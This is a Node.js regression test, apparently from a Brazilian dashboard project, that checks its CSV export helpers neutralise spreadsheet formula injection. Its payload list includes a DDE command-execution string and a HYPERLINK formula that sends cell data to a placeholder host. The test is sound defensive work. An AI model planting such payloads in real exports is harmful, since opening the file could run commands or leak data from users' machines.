// teste-csv-injecao.cjs (AZUL/ESQUERDA, 27/11) — CSV/Excel Injection nas exportações EXISTENTES do Dash.
// Transpila (esbuild 0.21.5, o mesmo da receita) o helper compartilhado e o export do panel-01 e roda os payloads clássicos.
// Uso: node scripts/seguranca/teste-csv-injecao.cjs <RAIZ> [esbuild]   ·   contraprova: rode com <RAIZ> = uma árvore anterior (ex.: a P133) — tem de reprovar.
'use strict';
const fs = require('fs'), path = require('path'), os = require('os');
const RAIZ = path.resolve(process.argv[2] || '.');
const es = require(process.argv[3] || path.join(RAIZ, 'public/react/node_modules/esbuild'));
const carregar = (rel) => {
  const f = path.join(RAIZ, rel); if (!fs.existsSync(f)) return null;
  const code = es.transformSync(fs.readFileSync(f, 'utf8'), { loader: 'ts', format: 'cjs', target: 'es2022' }).code;
  const m = { exports: {} }; new Function('module', 'exports', 'require', code)(m, m.exports, require); return m.exports;
};
let n = 0; const f = [];
const ok = (c, nome) => { n++; if (!c) f.push(nome); };
const PAYLOADS = ['=1+1', '+1+1', '-1+1', '@SUM(A1:A2)', '\t=1', '\r=1', '\n=1', ' =1', ' =1', '　=1', '＝1+1', '＋1', '－1', '＠x',
  '=HYPERLINK("http://exemplo.invalid/?d="&A1;"clique")', "=cmd|' /C calc'!A0", '-2+3+cmd|\' /C calc\'!A0'];
const SEGUROS = [['Cliente Fictício', 'Cliente Fictício'], ['a=b', 'a=b'], ['x-1', 'x-1'], ['e-mail@exemplo.invalid', 'e-mail@exemplo.invalid']];
// ── helper compartilhado (React: DataGrid, GradeServidor, AG Grid, Pipedrive) ──
const h = carregar('public/components/_shared-react/csv/neutralizar.ts');
if (!h) { ok(false, 'helper _shared-react/csv/neutralizar.ts ausente (versão sem a correção)'); }
else {
  const ruins = PAYLOADS.filter((p) => !h.neutralizarFormula(p).startsWith("'"));
  ok(ruins.length === 0, 'helper: os ' + PAYLOADS.length + ' payloads (= + - @, TAB/CR/LF, depois de espaço/NBSP/ideográfico, largura total, HYPERLINK, DDE) ganham apóstrofo · falharam ' + JSON.stringify(ruins));
  ok(SEGUROS.every(([i, o]) => h.neutralizarFormula(i) === o), 'helper: texto comum (com = ou - no MEIO, e-mail com @ no meio) passa intacto');
  ok(h.neutralizarFormula(-12.5) === '-12.5' && h.neutralizarFormula(0) === '0' && h.neutralizarFormula(10n) === '10' && h.neutralizarFormula(null) === '' && h.neutralizarFormula(undefined) === '' && h.neutralizarFormula(true) === 'true',
    'helper: número NEGATIVO tipado continua número (sem apóstrofo); bigint, booleano; nulo/indefinido = vazio');
  ok(h.celulaCsv('=1;2') === `"'=1;2"` && h.celulaCsv('a"b') === '"a""b"' && h.celulaCsv('linha\r\noutra') === '"linha\r\noutra"' && h.celulaCsv('=x\ny') === `"'=x\ny"`,
    'celulaCsv: neutraliza ANTES de pôr aspas; ; " CR LF entre aspas, aspas dobradas');
}
// ── panel-01 (vanilla, carregado sem bundle): toCSV ──
const p1 = carregar('public/components/panels/panel-01/utils/export.ts');
const csv1 = p1 ? p1.toCSV([{ nome: '=HYPERLINK("http://exemplo.invalid";"x")', valor: -10, obs: '@SUM(1)' }, { nome: 'Normal', valor: 5, obs: '+1' }], ['nome', 'valor', 'obs']) : '';
const lin = csv1.replace(/^﻿/, '').split('\n');
ok(lin[1] === `"'=HYPERLINK(""http://exemplo.invalid"";""x"")";-10;'@SUM(1)` && lin[2] === "Normal;5;'+1", 'panel-01 toCSV: fórmula neutralizada (com aspas por causa do ;), negativo tipado -10 intacto, @ e + neutralizados · ' + JSON.stringify(lin.slice(1)));
// ── estático: os exportadores alcançáveis usam o helper (nenhum escape próprio sem neutralização) ──
const ler = (rel) => { try { return fs.readFileSync(path.join(RAIZ, rel), 'utf8'); } catch { return ''; } };
const dg = ler('public/components/_shared-react/components/DataGrid.tsx'), gs = ler('public/components/_shared-react/ag-grid/GradeServidor.tsx');
const gr = ler('public/components/_shared-react/ag-grid/grade.ts'), eg = ler('public/components/panels/panel-pipedrive/src/screens/EntityGrid.tsx');
ok(/const esc = celulaCsv/.test(dg) && /from '\.\.\/csv\/neutralizar'/.test(dg), 'estático: DataGrid (Bling/Ads/DataTables) exporta pelo helper');
ok(/const esc = celulaCsv/.test(gs) && /from '\.\.\/csv\/neutralizar'/.test(gs), 'estático: GradeServidor exporta pelo helper');
ok(/processCellCallback: \(p\) => neutralizarFormula\(p\.formatValue \? p\.formatValue\(p\.value\) : p\.value\)/.test(gr) && /processHeaderCallback/.test(gr), 'estático: exportarCsv do AG Grid (Cobranças vencidas e demais) com processCellCallback + processHeaderCallback neutralizando');
ok(/const esc = celulaCsv/.test(eg) && /from '@shared\/csv\/neutralizar'/.test(eg), 'estático: Pipedrive (Negócios, Pessoas, Organizações, Atividades) exporta pelo helper');
// ── dinâmico (QI VERDE): o exportarCsv REAL do grade.ts com uma api simulada — o CSV leva o valor FORMATADO (valueFormatter) e neutraliza ──
try {
  const r = es.buildSync({ entryPoints: [path.join(RAIZ, 'public/components/_shared-react/ag-grid/grade.ts')], bundle: true, write: false, format: 'cjs', platform: 'node', target: 'es2022',
    logLevel: 'silent', external: ['ag-grid-*', '@ag-grid-community/*', '@ag-grid-enterprise/*', '*.css'] });
  const falso = (() => { const p = new Proxy(function () {}, { get: (_, k) => (k === Symbol.toPrimitive ? () => '' : p), apply: () => p, construct: () => p }); return p; })();   // o AG Grid não é necessário: a api é simulada
  const m = { exports: {} }; new Function('module', 'exports', 'require', r.outputFiles[0].text)(m, m.exports, (id) => (/^(ag-grid-|@ag-grid-)|\.css$/.test(id) ? falso : require(id)));
  let opts = null; m.exports.exportarCsv({ exportDataAsCsv: (o) => { opts = o; } }, 'x.csv');
  const fmtData = { value: '2026-10-05', formatValue: () => '05/10/2026' }, fmtMoeda = { value: 1234.5, formatValue: () => 'R$ 1.234,50' };
  const fmtForm = { value: '=1+1', formatValue: (v) => v }, semFmt = { value: '@SUM(A1)' };
  const out = opts && [fmtData, fmtMoeda, fmtForm, semFmt].map((p) => opts.processCellCallback(p));
  ok(!!out && out[0] === '05/10/2026' && out[1] === 'R$ 1.234,50' && out[2] === "'=1+1" && out[3] === "'@SUM(A1)", 'dinâmico: exportarCsv REAL (api simulada) leva o valor FORMATADO (data e moeda como na tela) e neutraliza a fórmula, com e sem formatValue · ' + JSON.stringify(out));
} catch (e) { ok(false, 'dinâmico: exportarCsv — ' + e.message); }
if (f.length) { console.log(`[ERRO] teste-csv-injecao: ${f.length} de ${n}`); for (const x of f) console.log(' - ' + x); process.exit(1); }
console.log(`[OK]   teste-csv-injecao: ${n} verificações (helper com ${PAYLOADS.length} payloads, texto comum intacto, números tipados preservados, aspas depois da neutralização, panel-01, 4 exportadores React pelo helper)`);
